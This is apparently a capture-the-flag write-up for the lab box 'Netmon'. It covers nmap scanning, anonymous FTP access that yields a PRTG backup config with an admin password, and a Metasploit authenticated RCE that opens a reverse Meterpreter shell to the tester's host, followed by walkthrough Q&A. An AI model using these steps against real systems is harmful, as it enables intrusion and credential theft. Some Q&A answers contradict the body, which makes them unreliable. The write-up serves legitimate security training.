# Netmon
### IP
10.10.10.152

### Initial Access
*NMAP*
```bash
 nmap -sC -sV -Pn -O 10.10.10.152
Starting Nmap 7.94SVN ( https://nmap.org ) at 2024-10-26 20:05 EDT
Nmap scan report for 10.10.10.152
Host is up (0.027s latency).
Not shown: 995 closed tcp ports (reset)
PORT    STATE SERVICE      VERSION
21/tcp  open  ftp          Microsoft ftpd
| ftp-anon: Anonymous FTP login allowed (FTP code 230)
| 02-03-19  12:18AM                 1024 .rnd
| 02-25-19  10:15PM       <DIR>          inetpub
| 07-16-16  09:18AM       <DIR>          PerfLogs
| 02-25-19  10:56PM       <DIR>          Program Files
| 02-03-19  12:28AM       <DIR>          Program Files (x86)
| 02-03-19  08:08AM       <DIR>          Users
|_10-26-24  05:59PM       <DIR>          Windows
| ftp-syst: 
|_  SYST: Windows_NT
80/tcp  open  http         Indy httpd 18.1.37.13946 (Paessler PRTG bandwidth monitor)
|_http-trane-info: Problem with XML parsing of /evox/about
|_http-server-header: PRTG/18.1.37.13946
| http-title: Welcome | PRTG Network Monitor (NETMON)
|_Requested resource was /index.htm
135/tcp open  msrpc        Microsoft Windows RPC
139/tcp open  netbios-ssn  Microsoft Windows netbios-ssn
445/tcp open  microsoft-ds Microsoft Windows Server 2008 R2 - 2012 microsoft-ds
No exact OS matches for host (If you know what OS is running on it, see https://nmap.org/submit/ ).
TCP/IP fingerprint:
OS:SCAN(V=7.94SVN%E=4%D=10/26%OT=21%CT=1%CU=39732%PV=Y%DS=2%DC=I%G=Y%TM=671
OS:D83CF%P=x86_64-pc-linux-gnu)SEQ(SP=102%GCD=1%ISR=109%TI=I%CI=I%II=I%TS=A
OS:)SEQ(SP=102%GCD=1%ISR=109%TI=I%CI=I%II=I%SS=S%TS=A)OPS(O1=M53CNW8ST11%O2
OS:=M53CNW8ST11%O3=M53CNW8NNT11%O4=M53CNW8ST11%O5=M53CNW8ST11%O6=M53CST11)W
OS:IN(W1=2000%W2=2000%W3=2000%W4=2000%W5=2000%W6=2000)ECN(R=Y%DF=Y%T=80%W=2
OS:000%O=M53CNW8NNS%CC=Y%Q=)T1(R=Y%DF=Y%T=80%S=O%A=S+%F=AS%RD=0%Q=)T2(R=Y%D
OS:F=Y%T=80%W=0%S=Z%A=S%F=AR%O=%RD=0%Q=)T3(R=Y%DF=Y%T=80%W=0%S=Z%A=O%F=AR%O
OS:=%RD=0%Q=)T4(R=Y%DF=Y%T=80%W=0%S=A%A=O%F=R%O=%RD=0%Q=)T5(R=Y%DF=Y%T=80%W
OS:=0%S=Z%A=S+%F=AR%O=%RD=0%Q=)T6(R=Y%DF=Y%T=80%W=0%S=A%A=O%F=R%O=%RD=0%Q=)
OS:T7(R=Y%DF=Y%T=80%W=0%S=Z%A=S+%F=AR%O=%RD=0%Q=)U1(R=Y%DF=N%T=80%IPL=164%U
OS:N=0%RIPL=G%RID=G%RIPCK=G%RUCK=G%RUD=G)IE(R=Y%DFI=N%T=80%CD=Z)

Network Distance: 2 hops
Service Info: OSs: Windows, Windows Server 2008 R2 - 2012; CPE: cpe:/o:microsoft:windows

Host script results:
| smb2-time: 
|   date: 2024-10-27T00:05:34
|_  start_date: 2024-10-24T02:54:36
|_clock-skew: mean: 3s, deviation: 0s, median: 3s
| smb-security-mode: 
|   account_used: guest
|   authentication_level: user
|   challenge_response: supported
|_  message_signing: disabled (dangerous, but default)
| smb2-security-mode: 
|   3:1:1: 
|_    Message signing enabled but not required

OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 26.58 seconds
```
## Checking out FTP
Since we can see that FTP is open lets try to login using the anonymous account, maybe it is not disabled and has some level of access.

```bash
ftp 10.10.10.152
Connected to 10.10.10.152.
220 Microsoft FTP Service
Name (10.10.10.152:user): anonymous
331 Anonymous access allowed, send identity (e-mail name) as password.
Password: 
230 User logged in.
Remote system type is Windows_NT.
ftp> cd Users/Public
250 CWD command successful.
ftp> ls
229 Entering Extended Passive Mode (|||49403|)
125 Data connection already open; Transfer starting.
01-15-24  11:03AM       <DIR>         op
02-03-19  08:05AM       <DIR>          Documents
07-16-16  09:18AM       <DIR>          Downloads
07-16-16  09:18AM       <DIR>          Music07-16-16  09:18AM       <DIR>          Pictures
07-16-16  09:18AM       <DIR>          Videos
226 Transfer complete.
ftp> cd Desktop
250 CWD command successful.
ftp> ls
229 Entering Extended Passive Mode (|||49484|)
150 Opening ASCII mode data connection.
02-03-19  12:18AM                 1195 PRTG Enterprise Console.lnk
02-03-19  12:18AM                 1160 PRTG Network Monitor.lnk
10-23-24  10:55PM                   34 user.txt
226 Transfer complete.
ftp> get user.txt
local: user.txt remote: user.txt
229 Entering Extended Passive Mode (|||49485|)
150 Opening ASCII mode data connection.
100% |***********************************************************************************************************************************************************************************************|    34        1.44 KiB/s    00:00 ETA
226 Transfer complete.
34 bytes received in 00:00 (1.43 KiB/s)
```
Great I was able to get the user.txt file but does not look like I can get access to the Administrator user folder using anonymous.

```bash
ftp> cd Users
250 CWD command successful.
ftp> ls
229 Entering Extended Passive Mode (|||49594|)
125 Data connection already open; Transfer starting.
02-25-19  11:44PM       <DIR>          Administrator
01-15-24  11:03AM       <DIR>          Public
226 Transfer complete.
ftp> cd Administrator
550 Access is denied. 
ftp> exit
```
Maybe we can get the configuration of that webapp, PRTG Network Monitor. Using Google, the path is C:\ProgramData\Paessler\PRTG Network Monitor.
```bash
ftp> cd ProgramData
250 CWD command successful.
ftp> ls
229 Entering Extended Passive Mode (|||49755|)
125 Data connection already open; Transfer starting.
12-15-21  10:40AM       <DIR>          Corefig
02-03-19  12:15AM       <DIR>          Licenses
11-20-16  10:36PM       <DIR>          Microsoft
02-03-19  12:18AM       <DIR>          Paessler
02-03-19  08:05AM       <DIR>          regid.1991-06.com.microsoft
07-16-16  09:18AM       <DIR>          SoftwareDistribution
02-03-19  12:15AM       <DIR>          TEMP
11-20-16  10:19PM       <DIR>          USOPrivate
11-20-16  10:19PM       <DIR>          USOShared
02-25-19  10:56PM       <DIR>          VMware
226 Transfer complete.
ftp> cd Paessler
250 CWD command successful
ftp> ls
229 Entering Extended Passive Mode (|||49827|)
150 Opening ASCII mode data connection.
10-23-24  11:36PM       <DIR>          Configuration Auto-Backups
10-26-24  08:00PM       <DIR>          Log Database
02-03-19  12:18AM       <DIR>          Logs (Debug)
02-03-19  12:18AM       <DIR>          Logs (Sensors)
02-03-19  12:18AM       <DIR>          Logs (System)
10-26-24  12:00AM       <DIR>          Logs (Web Server)
10-26-24  08:00PM       <DIR>          Monitoring Database
02-25-19  10:54PM              1189697 PRTG Configuration.dat
02-25-19  10:54PM              1189697 PRTG Configuration.old
07-14-18  03:13AM              1153755 PRTG Configuration.old.bak
10-26-24  08:12PM              1742731 PRTG Graph Data Cache.dat
02-25-19  11:00PM       <DIR>          Report PDFs
02-03-19  12:18AM       <DIR>          System Information Database
02-03-19  12:40AM       <DIR>          Ticket Database
02-03-19  12:18AM       <DIR>          ToDo Database
226 Transfer complete.
ftp> get "PRTG Configuration.old.bak"
local: PRTG Configuration.old.bak remote: PRTG Configuration.old.bak
229 Entering Extended Passive Mode (|||49830|)
125 Data connection already open; Transfer starting.
100% |***********************************************************************************************************************************************************************************************|  1126 KiB    1.15 MiB/s    00:00 ETA
226 Transfer complete.
1153755 bytes received in 00:00 (1.15 MiB/s)
ftp> exit
221 Goodbye.
``` 
## Getting Root
Now that we are able to download the configuration we find the password is *PrTg@dmin2019*. So lets try login.

Worked!! Looks like the version running is 18.1.37.13946 and from here, https://www.rapid7.com/db/modules/exploit/windows/http/prtg_authenticated_rce/,  we can exploit this.

```bash
msf6 > use exploit/windows/http/prtg_authenticated_rce
msf6 exploit(windows/http/prtg_authenticated_rce) > show options 

Module options (exploit/windows/http/prtg_authenticated_rce):

   Name            Current Setting  Required  Description
   ----            ---------------  --------  -----------
   ADMIN_PASSWORD  prtgadmin        yes       The password for the specified username
   ADMIN_USERNAME  prtgadmin        yes       The username to authenticate as
   Proxies                          no        A proxy chain of format type:host:port[,type:host:port][...]
   RHOSTS                           yes       The target host(s), see https://docs.metasploit.com/docs/using-metasploit/basics/using-metasploit.html
   RPORT           80               yes       The target port (TCP)
   SSL             false            no        Negotiate SSL/TLS for outgoing connections
   VHOST                            no        HTTP server virtual host
msf6 exploit(windows/http/prtg_authenticated_rce) > set RHOSTS 10.10.10.152
RHOSTS => 10.10.10.152
msf6 exploit(windows/http/prtg_authenticated_rce) > set AdMIN_PASSWORD PrTg@dmin2019
AdMIN_PASSWORD => PrTg@dmin2019
msf6 exploit(windows/http/prtg_authenticated_rce) > set LHOST 10.10.14.3
LHOST => 10.10.14.3
msf6 exploit(windows/http/prtg_authenticated_rce) > show options

Module options (exploit/windows/http/prtg_authenticated_rce):

   Name            Current Setting  Required  Description
   ----            ---------------  --------  -----------
   ADMIN_PASSWORD  PrTg@dmin2019    yes       The password for the specified username
   ADMIN_USERNAME  prtgadmin        yes       The username to authenticate as
   Proxies                          no        A proxy chain of format type:host:port[,type:host:port][...]
   RHOSTS          10.10.10.152     yes       The target host(s), see https://docs.metasploit.com/docs/using-metasploit/basics/using-metasploit.html
   RPORT           80               yes       The target port (TCP)
   SSL             false            no        Negotiate SSL/TLS for outgoing connections
   VHOST                            no        HTTP server virtual host


Payload options (windows/meterpreter/reverse_tcp):

   Name      Current Setting  Required  Description
   ----      ---------------  --------  -----------
   EXITFUNC  process          yes       Exit technique (Accepted: '', seh, thread, process, none)
   LHOST     10.10.14.3       yes       The listen address (an interface may be specified)
   LPORT     4444             yes       The listen port
msf6 exploit(windows/http/prtg_authenticated_rce) > exploit

[*] Started reverse TCP handler on 10.10.14.3:4444 
[+] Successfully logged in with provided credentials
[+] Created malicious notification (objid=2018)
[+] Triggered malicious notification
[+] Deleted malicious notification
[*] Waiting for payload execution.. (30 sec. max)
[*] Sending stage (176198 bytes) to 10.10.10.152
[*] Meterpreter session 1 opened (10.10.14.3:4444 -> 10.10.10.152:49817) at 2024-10-26 21:43:18 -0400
```
We got the flag!!!

## Walkthrough Questions
### Question 1
What is the name of the application running on port 80? Given the three words in the logo. *PRTG Network Monitor*

This can be found via the NMAP from above when you review the results from port 80

### Question 2
What service is running on TCP port 21? *FTP*

This also can be discovered via the NMAP that was run above 

### Question 3
Submit the flag located on the Public user's desktop. *Hiden Flag*

This can be found by trying to login in to the server using ftp and the anonymous login. See the information under the FTP section above for more detail.

### Question 4
What is the full path of the folder where PRTG Network Monitor saves its configuration files by default? *C:\ProgramData\Paessler\PRTG Network Monitor*

Path was got for googling the default path for PRTG

### Question 5
What is the name of the backup config file? *PRTG Configuration.old.bak*

See the FTP session above where I walkthrough how I got this 

### Question 6
What was the prtgadmin user's password according to that file? *PrTg@dmin2018*

From the back-up config file we downloaded from the FTP session 

### Question 7
What is the prtgadmin user's password on the website now? *PrTg@dmin2018*

Since this box was released in 2019 we follow the pattern.

### Question 8
What version of PRTG is installed? *18.1.37.13946*

This information can be found in the config file we downloaded and on the webpage when we login.

### Question 9
Which user is this software running as by default? Don't include anything before a \. *system*

We can find this once we have used the msf module to exploit the box 

### Question 10
Submit the flag located on the administrator's desktop. *root.txt*

Pull root.txt from desktop once you have exploited the box as system.

